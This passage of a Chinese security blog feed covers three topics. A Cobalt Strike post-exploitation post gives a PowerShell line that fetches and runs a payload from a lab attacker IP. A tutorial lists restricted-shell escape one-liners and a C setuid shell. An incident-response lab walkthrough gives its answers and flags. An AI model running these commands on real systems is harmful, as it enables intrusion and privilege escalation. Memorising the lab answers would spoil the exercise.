src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920168.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241921645.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241921896.png" data-fancybox="true"/></div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.74.131:80/a&#x27;))&quot;</span></span><br><span class="line">本质上也是通过powershell远程加载上线,但是稍微有点不同,</span><br><span class="line">这中攻击方式是攻击者在cs服务器上开启一个web站点</span><br><span class="line">然后靶机中运行powershell命令--&gt;向VPS发起请求--&gt;响应payload作为powershell要执行的命令</span><br><span class="line">属于payload远程加载执行的一种方式</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241921865.png" data-fancybox="true"/></div></div><h3 id="DLL文件上线"><a href="#DLL文件上线" class="headerlink" title="DLL文件上线"></a>DLL文件上线</h3><p><code>Attacks</code>—&gt;<code>Packages</code>—&gt;<code>Windows可执行程序</code>—&gt;<code>Windwos DLL</code> </p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241922000.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241922338.png" data-fancybox="true"/></div></div><p>将生成的dll文件上传到靶机 ， 然后在靶机注册dll文件上线</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241923597.png" data-fancybox="true"/></div></div><p><strong>在windows中可执行文件 , 不是只有.exe文件 , .dll文件和.com文件也都是可执行文件</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="Cobalt Strike" scheme="https://jiangjiyue.github.io/tags/Cobalt-Strike/"/>
    
    <category term="后渗透" scheme="https://jiangjiyue.github.io/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>后渗透-Restricted Shell Bypass</title>
    <link href="https://jiangjiyue.github.io/2024/07/28/ecc74cbe/"/>
    <id>https://jiangjiyue.github.io/2024/07/28/ecc74cbe/</id>
    <published>2024-07-28T01:04:30.000Z</published>
    <updated>2024-07-30T07:01:36.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 4.35K </p>    </div>    <div class="cell" style="">    <p>代码: 0.50K, 文本: 1.50K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 9 分钟</p>    </div>    </div><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>受限制的Shell是出于安全考虑而创建的，主要用于限制用户对系统的访问权限和阻止&#x2F;限制某些命令(如cd、ls、echo）。它通常在特定环境中使用，比如共享服务器、网络环境或受限的用户帐户。受限制的Shell可以阻止带有斜杠或输出重定向符号(如&gt;、&gt;&gt;）的命令。常见的受限制的Shell类型有rbash、rksh和rsh。</p></blockquote><p>但是，为什么有人会创建一个受限制的Shell呢？</p><ol><li>提高安全性</li><li>阻止黑客&#x2F;渗透测试人员</li><li>有时系统管理员会创建一个受限制的Shell来保护自己免受危险命令的影响</li><li>用于CTF挑战(Root-me&#x2F;hackthebox&#x2F;vulnhub）</li></ol><h2 id="枚举Linux环境"><a href="#枚举Linux环境" class="headerlink" title="枚举Linux环境"></a>枚举Linux环境</h2><p> 枚举是最重要的部分。我们需要枚举Linux环境，以确定如何绕过rbash。我们需要进行以下枚举：</p><ol><li><p>检查可用的命令：执行cd、ls、echo等常见命令，确认它们是否可用。在受限制的Shell中，可能会有一些命令被限制或禁用。</p><ul><li>检查cd命令：<code>cd ~</code>，将当前目录切换到用户的主目录。</li><li>检查ls命令：<code>ls</code>，列出当前目录中的文件和文件夹。</li><li>检查echo命令：<code>echo &quot;Hello, World!&quot;</code>，输出字符串”Hello, World!”。</li></ul></li><li><p>检查操作符：了解可用的操作符，如&gt;、&gt;&gt;、&lt;、|等。某些受限制的Shell可能会限制或禁用特定的操作符。</p><ul><li>检查&gt;操作符：<code>echo &quot;Text&quot; &gt; file.txt</code>，将字符串”Text”写入到file.txt文件中。</li><li>检查&gt;&gt;操作符：<code>echo &quot;More text&quot; &gt;&gt; file.txt</code>，将字符串”More text”追加写入到file.txt文件中。</li><li>检查&lt;操作符：<code>cat &lt; file.txt</code>，从file.txt文件中读取内容并输出。</li><li>检查|操作符：<code>ls | grep &quot;txt&quot;</code>，将ls命令的输出通过管道传递给grep命令，过滤包含”txt”的行。</li></ul></li><li><p>检查可用的编程语言：探索可用的编程语言，如perl、ruby、python等。这些语言常常提供了强大的功能，可以用于绕过受限制的Shell。</p><ul><li>检查Perl语言：<code>perl -e &#39;print &quot;Hello, Perl!\n&quot;&#39;</code>，执行Perl代码并输出字符串”Hello, Perl!”。</li><li>检查Ruby语言：<code>ruby -e &#39;puts &quot;Hello, Ruby!&quot;&#39;</code>，执行Ruby代码并输出字符串”Hello, Ruby!”。</li><li>检查Python语言：<code>python -c &#39;print(&quot;Hello, Python!&quot;)&#39;</code>，执行Python代码并输出字符串”Hello, Python!”。</li></ul></li><li><p>查看sudo权限：使用sudo -l命令检查当前用户是否具有以root身份运行某些命令的权限。这可能提供了以root权限执行某些命令的机会。</p><ul><li>检查当前用户的sudo权限：<code>sudo -l</code>，显示当前用户可以以root身份运行的命令列表。</li></ul></li><li><p>检查SUID权限的文件或命令：查找具有SUID权限的文件或命令，这些文件可以以文件所有者的权限而不是当前用户的权限来执行。</p><ul><li>检查SUID权限的文件：<code>find / -perm /4000</code>，查找系统中具有SUID权限的文件，并列出它们的路径。</li></ul></li><li><p>检查当前所使用的Shell：执行echo $SHELL命令，确认当前所使用的Shell是否为受限制的Shell，如rbash。这将有助于了解当前的环境限制。</p><ul><li>检查当前Shell：<code>echo $0</code>，显示当前使用的Shell。</li><li>检查当前Shell：<code>echo $SHELL</code>，显示当前使用的Shell。</li></ul></li><li><p>检查环境变量：运行env或printenv命令，查看当前的环境变量设置。这可以提供关于系统配置和可能的漏洞的信息。</p><ul><li>查看所有环境变量：<code>env</code>或<code>printenv</code>，显示当前的环境变量设置。</li></ul></li></ol><h2 id="常见的攻击技术"><a href="#常见的攻击技术" class="headerlink" title="常见的攻击技术"></a>常见的攻击技术</h2><p>现在让我们看一些常见的攻击技术。</p><ol><li><p><code>echo os.system(&#39;/bin/bash&#39;)</code></p></li><li><p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</code></p></li><li><p><code>/bin/sh -i</code></p></li><li><p><code>perl —e &#39;exec &quot;/bin/sh&quot;;&#39;</code></p></li><li><p><code>perl: exec &quot;/bin/sh&quot;;</code></p></li><li><p><code>ruby: exec &quot;/bin/sh&quot;</code></p></li><li><p><code>lua: os.execute(&#39;/bin/sh&#39;)</code></p></li><li><p>IRB:<code>exec &quot;/bin/sh&quot;</code></p></li><li><p>vi:</p><ol><li><code>:!bash</code></li><li><code>:set shell =/bin/bash:shell</code></li></ol></li><li><p><code>awk &#39;BEGIN &#123;system(&quot;/bin/sh or /bin/bash&quot;)&#125;&#39;</code></p></li><li><p><code>find / -name test -exec /bin/sh or /bin/bash \;</code></p></li><li><p>ssh:<br><code>ssh username@IP – t &quot;/bin/sh&quot; or &quot;/bin/bash&quot;</code><br><code>ssh username@IP -t &quot;bash –noprofile&quot;</code><br><code>ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot; (shellshock)</code><br><code>ssh -o ProxyCommand=&quot;sh -c /tmp/yourfile.sh&quot; 127.0.0.1 (SUID)</code></p></li><li><p>如果允许使用”&#x2F;“，可以运行<code>/bin/sh</code>或<code>/bin/bash</code>。</p></li><li><p>如果可以运行cp命令，可以将<code>/bin/sh</code>或<code>/bin/bash</code>复制到您的目录中。</p></li><li><p>从ftp &gt; <code>!/bin/sh or !/bin/bash </code></p></li><li><p>从gdb &gt; <code>!/bin/sh or !/bin/bash </code></p></li><li><p>从more&#x2F;man&#x2F;less &gt; <code>!/bin/sh or !/bin/bash </code></p></li><li><p>从vim &gt; <code>!/bin/sh or !/bin/bash </code></p></li><li><p>从rvim &gt; <code>python import os; os.system(&quot;/bin/bash&quot;) </code></p></li><li><p>从scp &gt; <code>scp -S /path/yourscript x y:</code></p></li><li><p>从awk &gt; <code>awk &#39;BEGIN &#123;system(&quot;/bin/sh or /bin/bash&quot;)&#125;&#39;</code></p></li><li><p>从find &gt; <code>find / -name test -exec /bin/sh or /bin/bash ;</code></p></li><li><p>git帮助状态下通过<code>!/bin/bash</code>进入交互式shell</p></li><li><p><code>pico -s &quot;/bin/bash&quot;</code>进入编辑器写入<code>/bin/bash</code>然后按ctrl + T键</p></li><li><p><code>zip /tmp/test.zip /tmp/test -T –unzip-command=&quot;sh -c /bin/bash&quot;</code></p></li><li><p><code>tar cf /dev/null testfile –checkpoint=1 –</code></p></li><li><p><code>checkpointaction=exec=/bin/bash</code></p></li></ol><h2 id="编程语言技术"><a href="#编程语言技术" class="headerlink" title="编程语言技术"></a>编程语言技术</h2><p> 现在，让我们看一些编程语言技术。 </p><ol><li>从expect &gt; <code>except spawn sh then sh</code>。 </li><li>从python &gt; <code>python -c &#39;import os; os.system(&quot;/bin/sh&quot;)&#39; </code></li><li>从php &gt; <code>php -a then exec(&quot;sh -i&quot;); </code></li><li>从perl &gt; <code>perl -e &#39;exec &quot;/bin/sh&quot;;&#39; </code></li><li>从lua &gt; <code>os.execute(&#39;/bin/sh&#39;)</code> </li><li>从ruby &gt; <code>exec &quot;/bin/sh&quot; </code></li></ol><h2 id="高级技术"><a href="#高级技术" class="headerlink" title="高级技术"></a>高级技术</h2><p>现在让我们进入一些比较高级且不那么正当的技术。 </p><ol><li><p>从ssh &gt; <code>ssh username@IP -t &quot;/bin/sh&quot;或&quot;/bin/bash&quot; </code></p></li><li><p>从ssh2 &gt; <code>ssh username@IP -t &quot;bash --noprofile&quot; 3）</code></p></li><li><p>从ssh3 &gt; <code>ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot;(shellshock)</code></p></li><li><p>从ssh4 &gt; <code>ssh -o ProxyCommand=&quot;sh -c /tmp/yourfile.sh&quot; 27.0.0.1(SUID)</code></p></li><li><p>从git &gt; git help status &gt; 然后可以执行<code>! /bin/bash</code></p></li><li><p>从pico &gt; <code>pico -s &quot;/bin/bash&quot;</code>，然后您可以写入<code>/bin/bash</code>，然后按下<code>CTRL + T</code></p></li><li><p>从zip &gt; <code>zip /tmp/test.zip /tmp/test -T --unzip-command=&quot;sh -c /bin/bash&quot; </code></p></li><li><p>从tar &gt; <code>tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash</code> </p></li><li><p>C SETUID SHELL:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>   <span class="comment">// 包含标准库头文件，提供通用工具函数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>   <span class="comment">// 包含POSIX操作系统API的头文件，例如提权函数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>    <span class="comment">// 包含输入输出函数的头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span> &#123;</span><br><span class="line">    setresgid(getegid(), getegid(), getegid());   <span class="comment">// 设置真实组ID、有效组ID和保存组ID都为当前进程的组ID</span></span><br><span class="line">    setresgid(geteuid(), geteuid(), geteuid());   <span class="comment">// 设置真实用户ID、有效用户ID和保存用户ID都为当前进程的用户ID</span></span><br><span class="line">    </span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, envp);   <span class="comment">// 使用execve函数执行/bin/sh，启动一个新的shell进程</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;   <span class="comment">// 返回0表示程序执行成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://jiangjiyue.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="漏洞利用" scheme="https://jiangjiyue.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    <category term="攻防演练" scheme="https://jiangjiyue.github.io/tags/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"/>
    
    <category term="靶机练习" scheme="https://jiangjiyue.github.io/tags/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>应急响应靶机训练-Linux2</title>
    <link href="https://jiangjiyue.github.io/2024/07/17/b05c14ed/"/>
    <id>https://jiangjiyue.github.io/2024/07/17/b05c14ed/</id>
    <published>2024-07-17T01:10:49.000Z</published>
    <updated>2024-07-16T06:53:54.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 17.89K </p>    </div>    <div class="cell" style="">    <p>代码: 15.04K, 文本: 1.35K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 1.19 小时</p>    </div>    </div><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>前景需要：看监控的石化发现WebShell告警,领导让你上机检查.你可以救救安服仔吗?</p><p>这是他的服务器，请你找出以下内容作为通关条件：</p><ol><li>黑客的IP地址 <psw>192.168.20.1</psw></li><li>黑客修改的管理员密码 <psw>Network@2020</psw></li><li>提交第一次WebShell的连接URL只需要提交参数及值部分: <psw>index.php?user-app-register</psw></li><li>提交WebShell连接密码 <psw>Network2020</psw></li><li>提交黑客使用的后续上传的木马文件名称 <psw>version2.php</psw></li><li>提交数据包中的Flag1 <psw>flag1{Network@_2020_Hack}</psw></li><li>提交黑客隐藏的Flag2 <psw>flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}</psw></li><li>提交黑客隐藏的Flag3 <psw>flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ}</psw></li></ol><h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><p>使用Vmware启动即可,如启动错误,请升级至Vmware17.5以上</p><p>相关账户密码:</p><ol><li>root&#x2F;<code>Inch@957821.</code></li></ol><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[root@web-server ~]<span class="comment"># ll -a</span></span><br><span class="line">总用量 4676</span><br><span class="line">dr-xr-x---.  6 root root     263 7月  16 18:39 .</span><br><span class="line">dr-xr-xr-x. 20 root root     288 3月   7 11:44 ..</span><br><span class="line">-rw-------.  1 root root    1232 3月   4 09:46 anaconda-ks.cfg</span><br><span class="line">-rw-------.  1 root root    1471 3月  20 15:39 .bash_history</span><br><span class="line">-rw-r--r--.  1 root root      18 12月 29 2013 .bash_logout</span><br><span class="line">-rw-r--r--.  1 root root     176 12月 29 2013 .bash_profile</span><br><span class="line">-rw-r--r--   1 root root     234 7月  16 18:39 .bashrc</span><br><span class="line">drwxr-xr-x   3 root root      17 3月   7 11:40 .cache</span><br><span class="line">-rw-r--r--.  1 root root     100 12月 29 2013 .cshrc</span><br><span class="line">-rw-r--r--   1 root root     195 3月   7 11:52 .pearrc</span><br><span class="line">drwxr-xr-x   2 root root      22 3月   7 11:39 .pip</span><br><span class="line">drwxr-----   3 root root      19 3月   7 11:37 .pki</span><br><span class="line">-rw-------   1 root root    1024 3月   7 11:51 .rnd</span><br><span class="line">drwx------   2 root root      69 3月  20 10:30 .ssh</span><br><span class="line">-rw-r--r--.  1 root root     129 12月 29 2013 .tcshrc</span><br><span class="line">-rw-------   1 root root     984 3月  20 15:03 .viminfo</span><br><span class="line">-rwxr-xr-x   1 root root 1880767 3月  20 15:31 wp</span><br><span class="line">-rw-r--r--   1 root root 2860888 3月  20 14:43 数据包1.pcapng</span><br><span class="line"></span><br><span class="line">[root@web-server ~]<span class="comment"># ll -a /tmp/</span></span><br><span class="line">总用量 28</span><br><span class="line">drwxrwxrwt.  7 root  root  4096 7月  16 18:53 .</span><br><span class="line">dr-xr-xr-x. 20 root  root   288 3月   7 11:44 ..</span><br><span class="line">-rw-r--r--   1 root  root     2 7月  16 18:43 bmac_008ba4b94bef52e84f51e7b5413f2dfc</span><br><span class="line">-rw-r--r--   1 root  root    10 7月  16 18:43 .fluah_time</span><br><span class="line">drwxrwxrwt.  2 root  root     6 3月   4 09:41 .font-unix</span><br><span class="line">drwxrwxrwt.  2 root  root     6 3月   4 09:41 .ICE-unix</span><br><span class="line">-rw-r--r--   1 root  root    18 7月  16 16:21 last_files_set_mode.pl</span><br><span class="line">srwxrwxrwx   1 mysql mysql    0 7月  16 18:39 mysql.sock</span><br><span class="line">-rw-------   1 mysql mysql    5 7月  16 18:39 mysql.sock.lock</span><br><span class="line">srw-rw-rw-   1 www   www      0 7月  16 18:38 php-cgi-56.sock</span><br><span class="line">-rw-------   1 www   www   4717 7月  16 18:54 sess_89mebtdvda26u9f2u8n08hm5qbq1bur3</span><br><span class="line">-rw-------   1 www   www      0 7月  16 18:44 sess_rpi1mkkd59ni3stcpdpgqumot1</span><br><span class="line">drwxrwxrwt.  2 root  root     6 3月   4 09:41 .Test-unix</span><br><span class="line">drwxrwxrwt.  2 root  root     6 3月   4 09:41 .X11-unix</span><br><span class="line">drwxrwxrwt.  2 root  root     6 3月   4 09:41 .XIM-unix</span><br></pre></td></tr></table></figure><p>发现一个全流量包</p><h3 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看运行了哪些服务,有无外联端口</span></span><br><span class="line">[root@web-server ~]<span class="comment"># netstat -atup</span></span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN      1218/nginx: master  </span><br><span class="line">tcp        0      0 0.0.0.0:ftp             0.0.0.0:*               LISTEN      1068/pure-ftpd (SER </span><br><span class="line">tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      1025/sshd           </span><br><span class="line">tcp        0      0 0.0.0.0:cddbp           0.0.0.0:*               LISTEN      1218/nginx: master  </span><br><span class="line">tcp        0      0 localhost:smtp          0.0.0.0:*               LISTEN      1581/master         </span><br><span class="line">tcp        0      0 0.0.0.0:12485           0.0.0.0:*               LISTEN      2152/python3        </span><br><span class="line">tcp        0     52 web-server:ssh          192.168.11:cns-srv-port ESTABLISHED 2370/sshd: root@pts </span><br><span class="line">tcp6       0      0 [::]:ftp                [::]:*                  LISTEN      1068/pure-ftpd (SER </span><br><span class="line">tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      1025/sshd           </span><br><span class="line">tcp6       0      0 localhost:smtp          [::]:*                  LISTEN      1581/master         </span><br><span class="line">tcp6       0      0 [::]:mysql              [::]:*                  LISTEN      2114/mysqld         </span><br><span class="line">udp        0      0 0.0.0.0:bootpc          0.0.0.0:*                           844/dhclient  </span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161425548.png" data-fancybox="true"/></div></div><h3 id="查看服务"><a href="#查看服务" class="headerlink" title="查看服务"></a>查看服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[root@web-server ~]<span class="comment"># ll -a /etc/systemd/system/</span></span><br><span class="line">总用量 8</span><br><span class="line">drwxr-xr-x. 11 root root 4096 3月   7 11:42 .</span><br><span class="line">drwxr-xr-x.  4 root root  151 3月   4 09:41 ..</span><br><span class="line">drwxr-xr-x.  2 root root   57 3月   4 09:41 basic.target.wants</span><br><span class="line">lrwxrwxrwx   1 root root   41 3月   7 11:42 dbus-org.fedoraproject.FirewallD1.service -&gt; /usr/lib/systemd/system/firewalld.service</span><br><span class="line">lrwxrwxrwx.  1 root root   57 3月   4 09:41 dbus-org.freedesktop.nm-dispatcher.service -&gt; /usr/lib/systemd/system/NetworkManager-dispatcher.service</span><br><span class="line">lrwxrwxrwx.  1 root root   37 3月   4 09:45 default.target -&gt; /lib/systemd/system/multi-user.target</span><br><span class="line">drwxr-xr-x.  2 root root   87 3月   4 09:41 default.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   32 3月   4 09:41 getty.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   35 3月   4 09:41 local-fs.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root 4096 3月   7 11:42 multi-user.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   48 3月   4 09:41 network-online.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   29 3月   4 09:41 sockets.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root  254 3月   4 09:41 sysinit.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   44 3月   4 09:41 system-update.target.wants</span><br><span class="line"></span><br><span class="line">[root@web-server ~]<span class="comment"># cd /</span></span><br><span class="line">[root@web-server /]<span class="comment"># ls</span></span><br><span class="line">bin   dev  home  lib64  mnt  patch  root  sbin  sys  usr  www</span><br><span class="line">boot  etc  lib   media  opt  proc   run   srv   tmp  var</span><br><span class="line"></span><br><span class="line">[root@web-server /]<span class="comment"># ll /www/</span></span><br><span class="line">总用量 4</span><br><span class="line">drw-------  6 root root 121 3月   7 12:06 backup</span><br><span class="line">-rw-r--r--  1 root root   5 3月   7 11:39 disk.pl</span><br><span class="line">drwxr-xr-x 17 root root 267 3月   7 11:53 server</span><br><span class="line">drwx-----x 10 www  www  249 3月   7 12:01 wwwlogs</span><br><span class="line">drwxr-xr-x  4 root root  38 3月   7 12:01 wwwroot</span><br><span class="line"></span><br><span class="line">[root@web-server /]<span class="comment"># ll /www/server/</span></span><br><span class="line">总用量 12</span><br><span class="line">drwxr-xr-x  2 root  root     6 3月   7 11:40 bt_tomcat_web</span><br><span class="line">drwxr-x---  6 mysql mysql 4096 7月  16 16:35 data</span><br><span class="line">drwxr-xr-x  3 root  root    19 3月   7 11:40 go_project</span><br><span class="line">-rw-r--r--  1 root  root    64 3月   7 11:45 lib.pl</span><br><span class="line">drwxr-xr-x 10 root  root   222 3月   7 12:01 mysql</span><br><span class="line">drwxr-xr-x 13 root  root   231 3月   7 12:01 nginx</span><br><span class="line">drwxr-xr-x  3 root  root    19 3月   7 11:40 nodejs</span><br><span class="line">drwxr-xr-x  3 root  root    21 3月   7 11:40 other_project</span><br><span class="line">drw------- 16 root  root  4096 3月   7 14:39 panel</span><br><span class="line">drwxr-xr-x  3 root  root    16 3月   7 11:52 php</span><br><span class="line">drwxr-xr-x  3 root  root    59 3月   7 11:53 phpmyadmin</span><br><span class="line">drwxr-xr-x  2 root  root     6 3月   7 11:40 proxy_project</span><br><span class="line">drwxr-xr-x  6 root  root    71 3月   7 11:51 pure-ftpd</span><br><span class="line">drwxr-xr-x  2 root  root     6 3月   7 11:41 pyporject_evn</span><br><span class="line">drwxr-xr-x  3 root  root    19 3月   7 11:41 python_project</span><br><span class="line">drwxr-xr-x  2 root  root    24 3月   7 11:40 stop</span><br></pre></td></tr></table></figure><p>存在宝塔集成环境</p><h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">[root@web-server /]<span class="comment"># history </span></span><br><span class="line">    systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line">    systemctl <span class="built_in">disable</span> --now firewalld</span><br><span class="line">    setenforce 0</span><br><span class="line">    vim</span><br><span class="line">    vi /etc/sysconfig/selinux </span><br><span class="line">    poweroff</span><br><span class="line">    ip a</span><br><span class="line">    <span class="built_in">cd</span> /var/</span><br><span 